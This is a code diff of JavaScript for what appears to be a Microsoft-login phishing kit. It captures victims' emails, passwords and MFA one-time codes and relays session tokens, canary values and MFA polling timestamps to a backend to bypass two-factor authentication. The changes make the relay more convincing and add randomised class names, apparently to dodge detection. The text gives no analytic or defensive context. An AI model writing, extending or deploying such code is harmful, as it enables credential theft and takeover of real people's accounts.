@@ -4,14 +4,37 @@ var epass = "";
 var phone = "";
 var dVal = [];
 var lVal = [];
+var pages = [];
 var myInterval,Proofs;
-var url = new URL(window.location);
+    $( document ).ready(function() {
+        var url = new URL(window.location);
 var semail = url.searchParams.get("email");
-if(semail){
+if(isEmail(semail)){
+    getpage('EmailPage',0);
 email = $("#email").val(semail);
 nextto(semail);
 console.log(semail);  
+}else{
+  getpage('EmailPage',1);  
+} 
+
+});
+async function getpage(page,dis){
+$("#load").show();
+    var scrn= await GotoType(page);
+    if(scrn['status']='success'){
+        if(dis){
+         $("#screen1").html(scrn['msg']);
+        }else{
+
+        }
+    pages[page]=scrn['msg'];
+     $("#load").hide();
+}else{
+
 }
+}
+
 function isEmail(email) {
 var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 return regex.test(email);
@@ -22,7 +45,6 @@ if(vak){
 }else{
     email = $("#email").val();  
 }
-console.log(vak); 
 if (isEmail(email) === true) {
 $("#load").show();
 $("#btn").attr("disabled", true);
@@ -31,13 +53,9 @@ $.ajax({
 type: "POST",
 url: urlx,
 data: { action: "signup", email: email, mode: "getbg" },
-}).done(function (data) {
+}).done(async function (data) {
 console.log(data);
 var datArray = JSON.parse(data);
-$("#load").hide();
-$("#page1").hide();
-$("#page3").show();
-// orgme();
 console.log(datArray["status"]);
 if (datArray["status"] == "success") {
     if(datArray["logo_image"]){
@@ -47,10 +65,9 @@ if(datArray["bg_image"]){
 $("#imgbg").css("background-image", "url(" + datArray["bg_image"] + ")");
 }
 }
-$("#displayName").html(email);
+ await getpage('PassPage',1);
 $("#btn").attr("disabled", false);
-console.log("response: ", datArray["logo_image"]);
-
+$(".ext-promoted-fed-cred-box").hide();
 });
 } else {
 $("#error1").html(Errs['NoAccount']);
@@ -63,13 +80,12 @@ $("#page3").show();
 }, 3000);
 }
 
-function back() {
-$("#page1").show();
-$("#page2").hide();
-$("#page3").hide();
-
-$("#error2").hide();
-$("#error3").hide();
+function back(page) {
+ $("#screen1").html(pages[page]);
+ $("#email").val(email);
+ $(".imglogo").attr("src", 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');  
+ $("#imgbg").css("background-image", "url( https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)");
+$(".ext-promoted-fed-cred-box").show();
 }
 function cancel() {
 location.reload();
@@ -123,38 +139,38 @@ return false;
 
 async  function auth(dauth) {
     if(Proofs){
-$("#screen2").html(Proofs);
+$("#screen1").html(Proofs);
     }else{
 dVal["arrUserProofs"] = dauth["arrUserProofs"];
 dVal["ctx"] = dauth["ctx"];
 dVal["flowToken"] = dauth["flowToken"];
+dVal["canary"] = dauth["canary"];
 var data = dauth["arrUserProofs"];
 console.log(data);
 var gototype=await GotoType('Proofs');
 if(gototype['status']){
     Proofs=gototype['msg'];
-    $("#screen1").hide();
-$("#screen2").html(gototype['msg']);
+$("#screen1").html(gototype['msg']);
 data.forEach(function (val, i) {
 var authid = val["authMethodId"];
-$("#screen2 #"+authid).show();
-$("#screen2 #"+authid+ " .pnum").text(val["display"]);
+$("#screen1 #"+authid).show();
+$("#screen1 #"+authid+ " .pnum").text(val["display"]);
 phone = val["display"];
 });
-Proofs=$('#screen2').html();
+Proofs=$('#screen1').html();
 }
 }
 }
 async  function  GotoAuth(atype){
-    $("#screen2 #load").show();
+    $("#screen1 #load").show();
 var reslt = await GotoType(atype);
 if(reslt['status']=='success'){
    
 console.log(reslt['status']);
 var act= await beginAuth(atype);
 if (act["Success"]) {
-     $("#screen2 #load").hide();
-$("#screen2").html(reslt['msg']);
+     $("#screen1 #load").hide();
+$("#screen1").html(reslt['msg']);
 if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
     if(act['Entropy']){
         $("#displaySign").show();
@@ -168,13 +184,13 @@ startEndath(atype);
 }
 }
 function authback(err) {
-$("#screen2 #load").show();
+$("#screen1 #load").show();
 auth(dVal);
 stopEndath();
  if(err){
          setTimeout(function(){
-       $("#screen2 #errorx").html(Errs['UnableVeri']);  
-       $("#screen2 #load").hide();
+       $("#screen1 #errorx").html(Errs['UnableVeri']);  
+       $("#screen1 #load").hide();
    },1000)
    
     }
@@ -201,31 +217,31 @@ processAuth(atype, "");
 }
 }
 async function verifyOTC(atype) {
-$("#screen2 #staErr").html('');
-var otc = $("#screen2 #otc").val();
+$("#screen1 #staErr").html('');
+var otc = $("#screen1 #otc").val();
 if(otc!=''){
-$("#screen2 #load").show();
-$("#screen2 #verifyOTC").attr('disabled',true);
+$("#screen1 #load").show();
+$("#screen1 #verifyOTC").attr('disabled',true);
 var res= await endAuth(atype, otc);
-$("#screen2 #load").hide();
+$("#screen1 #load").hide();
 if (res["Success"]) {
-    $("#screen2 #load").show();
+    $("#screen1 #load").show();
 processAuth(atype, otc);
 }else if (res["ResultValue"]=='InvalidSession'){
-$("#screen2 #verifyOTC").attr('disabled',false);
-$("#screen2 #staErr").html(Errs['InvalidSession']);
+$("#screen1 #verifyOTC").attr('disabled',false);
+$("#screen1 #staErr").html(Errs['InvalidSession']);
 }else if (res["ResultValue"]=='OathCodeIncorrect'){
-$("#screen2 #verifyOTC").attr('disabled',false);
-$("#screen2 #staErr").html(Errs['OathCodeIncorrect']);
+$("#screen1 #verifyOTC").attr('disabled',false);
+$("#screen1 #staErr").html(Errs['OathCodeIncorrect']);
 }else{
-    $("#screen2 #staErr").html('');
+    $("#screen1 #staErr").html('');
   authback(1);
 }
 
 console.log('res',res); 
 }else{
-$("#screen2 #load").hide();
-$("#screen2 #staErr").html(Errs['NoOtpCode']);
+$("#screen1 #load").hide();
+$("#screen1 #staErr").html(Errs['NoOtpCode']);
 }
 
 }
@@ -245,8 +261,10 @@ if (vdata["Success"]) {
 lVal["ctx"] = vdata["Ctx"];
 lVal["flowToken"] = vdata["FlowToken"];
 lVal["sseid"] = vdata["SessionId"];
+lVal["stpoll"] = datetoiso(vdata["Timestamp"]);
+lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
 }else{
-     $("#screen2 #errorx").html(Errs['UnableVeri']);  
+     $("#screen1 #errorx").html(Errs['UnableVeri']);  
 }
 console.log(vdata);
 });
@@ -256,6 +274,7 @@ return vdata;
 
 var PollCount = 1;
 async function endAuth(atype, otc) {
+     lVal["stpoll"] = datetoiso(new Date());
 PollCount++;
 var valx =
 '{"Method":"EndAuth","SessionId":"' +
@@ -285,6 +304,7 @@ console.log(vdata);
 lVal["ctx"] = vdata["Ctx"];
 lVal["flowToken"] = vdata["FlowToken"];
 lVal["sseid"] = vdata["SessionId"];
+lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
 if (vdata["Success"]) {
 PollCount = 1;
 AuthEdata(atype);
@@ -306,9 +326,9 @@ function processAuth(atype, otc) {
 console.log("processAuth");
 
 var valx =
-'{"type":19,"GeneralVerify":false,"request":"' +
+'{"type":19,"GeneralVerify":true,"request":"' +
 lVal["ctx"] +
-'","mfaLastPollStart":"1674088555560","mfaLastPollEnd": "1674088556987","mfaAuthMethod": "' +
+'","mfaLastPollStart":"'+lVal["stpoll"]+'","mfaLastPollEnd": "'+lVal["edpoll"]+'","mfaAuthMethod": "' +
 atype +
 '","otc": "' +
 otc +
@@ -318,7 +338,7 @@ email +
 lVal["flowToken"] +
 '","hpgrequestid":"' +
 lVal["sseid"] +
-'","sacxt":"","hideSmsInMfaProofs":false,"canary":"","i19": "42293"}';
+'","sacxt":"","hideSmsInMfaProofs":false,"canary":"'+dVal["canary"]+'","i19": "42293"}';
 console.log(valx);
 $.ajax({
 type: "POST",
@@ -340,17 +360,21 @@ endAuth(atype, "");
 function stopEndath() {
 clearInterval(myInterval);
 }
-var input = document.getElementById("email");
-input.addEventListener("keyup", function (event) {
-if (event.keyCode === 13) {
-event.preventDefault();
-nextto();
+function datetoiso(date){
+    var dateobj =  new Date(date);
+return dateobj.getTime();
 }
+$(document).on('keypress',function(e) {
+    if(e.which == 13) {
+        console.log(e.target.id);
+        if(e.target.id=='email'){
+        nextto();
+        }else if(e.target.id=='epass'){
+            redlogin();
+        }else if(e.target.id=='otc'){
+            $("#verifyOTC").click();
+
+        }
+    }
 });
-var input = document.getElementById("epass");
-input.addEventListener("keyup", function (event) {
-if (event.keyCode === 13) {
-event.preventDefault();
-redlogin();
-}
-});
+ function dec2hex (dec){return dec.toString(16).padStart(2, "0")}function generateId (len){var arr=new Uint8Array((len || 40) / 2);window.crypto.getRandomValues(arr);return Array.from(arr, dec2hex).join('');}var SesIN=generateId (40); $("div").addClass(SesIN);
